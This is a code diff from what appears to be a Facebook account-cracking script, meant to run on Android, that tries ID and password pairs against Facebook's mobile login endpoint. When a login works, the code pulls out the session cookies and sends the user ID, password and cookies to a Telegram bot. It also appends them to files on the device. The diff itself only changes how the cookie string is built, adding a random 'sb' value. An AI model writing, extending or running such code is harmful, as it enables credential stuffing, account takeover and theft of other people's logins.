@@ -1012,16 +1012,16 @@ def m8(ids,pwv):
             url = 'https://m.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
-                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{cookie}\33[1;36m");linex()
+                        statusok = (f" {cid} | {pas} | {cookie} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+cookie+'\n')
                         oks.append(cid)
                         break
             elif 'www.facebook.com' in q['error']['message']:
